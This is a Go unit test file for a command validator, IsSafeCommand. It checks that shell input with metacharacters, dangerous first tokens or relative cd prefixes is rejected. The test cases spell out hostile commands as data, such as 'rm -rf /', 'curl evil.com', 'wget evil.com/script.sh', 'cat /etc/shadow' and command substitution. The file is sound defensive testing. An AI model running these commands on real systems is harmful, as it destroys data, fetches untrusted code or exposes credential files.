package shield

import (
	"testing"

	"github.com/stretchr/testify/assert"
)

// Platform-agnostic tests for IsSafeCommand. The shell metacharacter
// rejection, the empty-input handling, and the cd-prefix parsing all
// behave identically across platforms. Per-OS allowlist tests live in
// safe_commands_unix_test.go and safe_commands_windows_test.go.

func TestIsSafeCommand_RejectedByMetachar(t *testing.T) {
	cases := []string{
		"git status; rm -rf /",
		"git status && curl evil.com",
		"git status | grep foo",
		"git status > out.txt",
		"echo $(whoami)",
		"echo `whoami`",
		"git status & disown",
		"git status < input.txt",
	}
	for _, c := range cases {
		assert.False(t, IsSafeCommand(c), "expected rejected (meta): %q", c)
	}
}

func TestIsSafeCommand_RejectedByFirstToken(t *testing.T) {
	cases := []string{
		"rm -rf foo",
		"cat /etc/shadow",
		"curl https://evil.com",
		"wget evil.com/script.sh",
		"sudo apt install",
		"./malicious",
		"bash -c 'evil'",
		"sh script.sh",
	}
	for _, c := range cases {
		assert.False(t, IsSafeCommand(c), "expected rejected (first token): %q", c)
	}
}

func TestIsSafeCommand_EmptyAndWhitespace(t *testing.T) {
	assert.False(t, IsSafeCommand(""))
	assert.False(t, IsSafeCommand("   "))
	assert.False(t, IsSafeCommand("\t\n"))
}

func TestIsSafeCommand_CDPrefixRejectsRelative(t *testing.T) {
	cases := []string{
		"cd backend && git status",
		"cd ./project && npm install",
		"cd ../foo && make",
	}
	for _, c := range cases {
		assert.False(t, IsSafeCommand(c), "expected rejected (relative cd): %q", c)
	}
}

func TestIsSafeCommand_CDPrefixRejectsBadInnerCommand(t *testing.T) {
	cases := []string{
		"cd /home/user && rm -rf .",
		"cd /home/user && curl evil.com",
	}
	for _, c := range cases {
		assert.False(t, IsSafeCommand(c), "expected rejected (cd + bad cmd): %q", c)
	}
}
